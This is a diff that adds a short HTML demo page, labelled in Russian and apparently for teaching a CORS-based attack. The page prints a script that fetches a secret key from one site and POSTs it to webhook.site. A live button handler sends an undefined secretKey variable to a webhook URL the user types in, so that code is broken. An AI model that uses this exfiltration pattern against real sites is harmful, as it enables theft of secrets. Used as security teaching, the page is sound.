@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CORS</title>
+</head>
+<body>
+    <h1>CORS</h1>
+    <p>Код скрипта:</p>
+    <pre>
+        &lt;script&gt;
+            fetch('https://home.com/secret-key')
+               .then(response => response.text())
+               .then(secretKey => {
+                    fetch('https://webhook.site/secret-key', {
+                        method: 'POST',
+                        body: secretKey
+                    });
+                });
+        &lt;/script&gt;
+    </pre>
+    <button id="execute-script">Выполнить скрипт</button>
+    <script>
+        document.getElementById('execute-script').addEventListener('click', () => {
+            // Вставьте ссылку на webhook.site
+            const webhookUrl = prompt('Введите ссылку на webhook.site:');
+            fetch(webhookUrl, {
+                method: 'POST',
+                body: 'Секретный ключ:'+ secretKey
+            });
+        });
+    </script>
+</body>
+</html>
